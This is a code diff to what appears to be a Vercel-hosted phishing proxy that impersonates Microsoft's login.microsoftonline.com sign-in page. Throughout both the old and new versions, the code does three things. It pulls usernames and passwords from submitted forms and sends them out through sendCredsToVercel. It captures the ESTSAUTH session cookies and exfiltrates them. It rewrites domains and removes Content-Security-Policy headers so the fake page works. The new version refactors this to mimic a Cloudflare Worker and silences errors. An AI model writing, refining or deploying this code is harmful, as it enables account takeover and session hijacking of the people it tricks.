@@ -40,7 +40,7 @@ async function exfiltrateCookiesFile(cookieText, ip) {
 async function handleProxy(request, pathSegments = []) {
   const url = new URL(request.url);
   
-  // Get client info from Vercel headers
+  // Get client info from Vercel headers (equivalent to Cloudflare headers)
   const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
   const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
 
@@ -49,228 +49,118 @@ async function handleProxy(request, pathSegments = []) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  // Build upstream path - handle root and nested paths
-  let upstreamPath = UPSTREAM_PATH;
-  if (pathSegments.length > 0) {
-    upstreamPath = UPSTREAM_PATH + pathSegments.join('/');
-  }
-
-  // Build upstream URL with proper query parameter handling
-  const upstreamUrl = new URL(`https://${UPSTREAM}${upstreamPath}`);
+  // Build URL like Cloudflare Worker does
+  const url_hostname = url.hostname;
+  const upstream_domain = UPSTREAM;
   
-  // Copy ALL query parameters from original request to upstream URL
-  url.searchParams.forEach((value, key) => {
-    upstreamUrl.searchParams.set(key, value);
-  });
+  // Create new URL object for upstream like Cloudflare Worker
+  const upstreamUrl = new URL(request.url);
+  upstreamUrl.protocol = 'https:';
+  upstreamUrl.host = upstream_domain;
+
+  // Handle path like Cloudflare Worker
+  if (upstreamUrl.pathname === '/') {
+    upstreamUrl.pathname = UPSTREAM_PATH;
+  } else {
+    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
+  }
 
   console.log('Proxying to:', upstreamUrl.toString());
-  console.log('Query params:', Object.fromEntries(upstreamUrl.searchParams));
-  console.log('Login hint:', url.searchParams.get('loginhint'));
 
-  // Build headers for upstream fetch - PRESERVE ALL COOKIES
-  const upstreamHeaders = new Headers();
-  for (const [key, value] of request.headers.entries()) {
-    if (!['host', 'referer', 'content-length'].includes(key.toLowerCase())) {
-      upstreamHeaders.set(key, value);
-    }
-  }
+  // Build headers EXACTLY like Cloudflare Worker
+  const method = request.method;
+  const request_headers = request.headers;
+  const new_request_headers = new Headers(request_headers);
 
-  // CRITICAL: Preserve original cookies exactly as received
-  const originalCookies = request.headers.get('cookie');
-  if (originalCookies) {
-    // Forward the exact cookies the client sent to Microsoft
-    upstreamHeaders.set('cookie', originalCookies);
-    console.log('Forwarding cookies to upstream:', originalCookies);
-  }
-
-  upstreamHeaders.set('Host', UPSTREAM);
-  upstreamHeaders.set('Referer', `https://${url.hostname}`);
+  new_request_headers.set('Host', upstream_domain);
+  new_request_headers.set('Referer', `https://${url_hostname}`);
 
   // ---- Credentials capture for POST requests ----
-  let requestBody = null;
-
-  if (request.method === 'POST') {
+  if (method === 'POST') {
     try {
-      const clonedReq = request.clone();
-      const bodyText = await clonedReq.text();
-      
-      // CRITICAL: Use the original body without modification
-      requestBody = bodyText;
-      
-      const params = new URLSearchParams(bodyText);
-      const user = params.get('login');
-      const pass = params.get('passwd');
-      
-      // Extract credentials for exfiltration but PRESERVE ALL FORM FIELDS
-      if (user && pass) {
-        console.log('Extracting credentials - preserving all form fields');
-        await sendCredsToVercel({
-          type: "creds",
-          ip: ipAddress,
-          user: decodeURIComponent(user.replace(/\+/g, ' ')),
-          pass: decodeURIComponent(pass.replace(/\+/g, ' ')),
-          // Log additional context for debugging
-          additional_fields: Array.from(params.keys()).filter(k => !['login', 'passwd'].includes(k))
-        });
-      }
-      
-      // Log session-related form fields for debugging
-      const sessionFields = ['ctx', 'flow_token', 'canary', 'hpgrequestid', 'PPFT'];
-      sessionFields.forEach(field => {
-        if (params.get(field)) {
-          console.log(`Session field ${field} found in POST data`);
+      const temp_req = await request.clone();
+      const body = await temp_req.text();
+      const keyValuePairs = body.split('&');
+      let user, pass;
+      for (const pair of keyValuePairs) {
+        const [key, value] = pair.split('=');
+        if (key === 'login') {
+          user = decodeURIComponent(value.replace(/\+/g, ' '));
         }
-      });
-      
+        if (key === 'passwd') {
+          pass = decodeURIComponent(value.replace(/\+/g, ' '));
+        }
+      }
+      if (user && pass) {
+        await sendCredsToVercel({ type: "creds", ip: ipAddress, user, pass });
+      }
     } catch (error) {
-      console.error('Error processing POST request:', error);
+      // Intentionally silent
     }
   }
 
-  // Prepare fetch options
-  const opts = {
-    method: request.method,
-    headers: upstreamHeaders,
-    redirect: 'manual',
-    body: ['GET', 'HEAD'].includes(request.method) ? undefined : (requestBody || request.body)
-  };
-
-  let upstreamResponse;
-  try {
-    upstreamResponse = await fetch(upstreamUrl.toString(), opts);
-  } catch (error) {
-    console.error('Upstream fetch error:', error);
-    return new Response('Upstream error: ' + error.message, { status: 502 });
-  }
-
-  // Enhanced redirect handling to preserve query parameters
-  if ([301, 302, 303, 307, 308].includes(upstreamResponse.status)) {
-    const location = upstreamResponse.headers.get('location');
-    if (location) {
-      let modifiedLocation = location;
-      
-      // Replace Microsoft domain in redirect location
-      modifiedLocation = modifiedLocation.replace(
-        /https?:\/\/login\.microsoftonline\.com/gi, 
-        `https://${url.hostname}`
-      );
-      
-      // If redirect is relative, ensure it includes our domain and preserves query params
-      if (modifiedLocation.startsWith('/')) {
-        const redirectUrl = new URL(modifiedLocation, `https://${url.hostname}`);
-        // Preserve original query parameters in redirects
-        url.searchParams.forEach((value, key) => {
-          if (!redirectUrl.searchParams.has(key)) {
-            redirectUrl.searchParams.set(key, value);
-          }
-        });
-        modifiedLocation = redirectUrl.toString();
-      } else {
-        // For absolute URLs, still replace domain and preserve params
-        const redirectUrl = new URL(modifiedLocation);
-        url.searchParams.forEach((value, key) => {
-          if (!redirectUrl.searchParams.has(key)) {
-            redirectUrl.searchParams.set(key, value);
-          }
-        });
-        modifiedLocation = redirectUrl.toString().replace(
-          /https?:\/\/login\.microsoftonline\.com/gi, 
-          `https://${url.hostname}`
-        );
-      }
-      
-      const responseHeaders = new Headers(upstreamResponse.headers);
-      responseHeaders.set('location', modifiedLocation);
-      return new Response(null, {
-        status: upstreamResponse.status,
-        headers: responseHeaders
-      });
-    }
-  }
-
-  // Process response headers
-  const responseHeaders = new Headers(upstreamResponse.headers);
-  
-  // Add CORS headers
-  responseHeaders.set('Access-Control-Allow-Origin', '*');
-  responseHeaders.set('Access-Control-Allow-Credentials', 'true');
-  
-  // Remove security headers
-  responseHeaders.delete('Content-Security-Policy');
-  responseHeaders.delete('Content-Security-Policy-Report-Only');
-  responseHeaders.delete('Clear-Site-Data');
-
-  // ---- Cookie processing and exfiltration ----
-  let allCookies = '';
-  const cookieHeaders = responseHeaders.get('set-cookie');
-  
-  if (cookieHeaders) {
-    const cookiesArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
-    allCookies = cookiesArray.join('; \n\n');
-    
-    // Modify cookie domains to work with our proxy
-    const modifiedCookies = cookiesArray.map(cookie => 
-      cookie.replace(/login\.microsoftonline\.com/gi, url.hostname)
-    );
-    
-    // Replace original cookies with modified ones
-    responseHeaders.delete('set-cookie');
-    modifiedCookies.forEach(cookie => {
-      responseHeaders.append('set-cookie', cookie);
-    });
-  }
-
-  // Exfiltrate cookies if auth cookies detected
-  if (allCookies.includes('ESTSAUTH') && allCookies.includes('ESTSAUTHPERSISTENT')) {
-    await exfiltrateCookiesFile(allCookies, ipAddress);
-  }
-
-  // Process response body for domain replacement
-  const contentType = responseHeaders.get('content-type');
-  let responseBody;
-
-  if (contentType && /(text\/html|application\/javascript|application\/json)/i.test(contentType)) {
-    try {
-      const text = await upstreamResponse.text();
-      let modifiedText = text
-        .replace(/login\.microsoftonline\.com/gi, url.hostname)
-        .replace(/https:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`)
-        .replace(/http:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
-      
-      // Enhanced JavaScript to handle login hints if present in query params
-      const loginHint = url.searchParams.get('loginhint');
-      const prompt = url.searchParams.get('prompt');
-      
-      if (loginHint) {
-        // Replace login_hint in hidden form fields and JavaScript variables
-        // FIXED: Properly escaped regular expressions
-        modifiedText = modifiedText
-          .replace(/(<input[^>]*name="login"[^>]*value=")[^"]*(")/gi, `$1${loginHint}$2`)
-          .replace(/(<input[^>]*name="loginhint"[^>]*value=")[^"]*(")/gi, `$1${loginHint}$2`)
-          .replace(/(window\.loginHint\s*=\s*["'])[^"']*(["'])/gi, `$1${loginHint}$2`)
-          .replace(/(var\s+loginHint\s*=\s*["'])[^"']*(["'])/gi, `$1${loginHint}$2`);
-      }
-      
-      if (prompt) {
-        modifiedText = modifiedText
-          .replace(/(<input[^>]*name="prompt"[^>]*value=")[^"]*(")/gi, `$1${prompt}$2`);
-      }
-      
-      responseBody = modifiedText;
-    } catch (error) {
-      console.error('Error processing response body:', error);
-      // Fallback to original response
-      const responseClone = upstreamResponse.clone();
-      responseBody = responseClone.body;
-    }
-  } else {
-    responseBody = upstreamResponse.body;
-  }
-
-  return new Response(responseBody, {
-    status: upstreamResponse.status,
-    headers: responseHeaders,
+  // ---- Proxy request to upstream EXACTLY like Cloudflare Worker ----
+  let original_response = await fetch(upstreamUrl.toString(), {
+    method: method,
+    headers: new_request_headers,
+    body: ["GET", "HEAD"].includes(method) ? null : request.body
   });
+
+  // Handle WebSocket upgrades like Cloudflare Worker
+  let connection_upgrade = new_request_headers.get("Upgrade");
+  if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
+    return original_response;
+  }
+
+  // Process response like Cloudflare Worker
+  let original_response_clone = original_response.clone();
+  let response_headers = original_response.headers;
+  let new_response_headers = new Headers(response_headers);
+  let status = original_response.status;
+
+  new_response_headers.set('access-control-allow-origin', '*');
+  new_response_headers.set('access-control-allow-credentials', 'true');
+  new_response_headers.delete('content-security-policy');
+  new_response_headers.delete('content-security-policy-report-only');
+  new_response_headers.delete('clear-site-data');
+
+  // ---- Capture and exfil cookies as file ----
+  let all_cookies = "";
+  try {
+    const originalCookies = (typeof new_response_headers.getAll === "function")
+      ? new_response_headers.getAll("Set-Cookie")
+      : (new_response_headers.get("Set-Cookie") ? [new_response_headers.get("Set-Cookie")] : []);
+    all_cookies = originalCookies.join("; \n\n");
+    originalCookies.forEach(originalCookie => {
+      const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
+      new_response_headers.append("Set-Cookie", modifiedCookie);
+    });
+  } catch (error) {
+    console.error(error);
+  }
+
+  // Only exfiltrate if key auth cookies are present
+  if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
+    await exfiltrateCookiesFile(all_cookies, ipAddress);
+  }
+
+  // ---- Body replacement for domain ----
+  const content_type = new_response_headers.get('content-type');
+  let original_text = null;
+  if (content_type && /(text\/html|application\/javascript|application\/json)/i.test(content_type)) {
+    let text = await original_response_clone.text();
+    text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
+    original_text = text;
+  } else {
+    original_text = original_response_clone.body;
+  }
+
+  const response = new Response(original_text, {
+    status,
+    headers: new_response_headers
+  });
+
+  return response;
 }
 
 // Export handlers for common HTTP methods
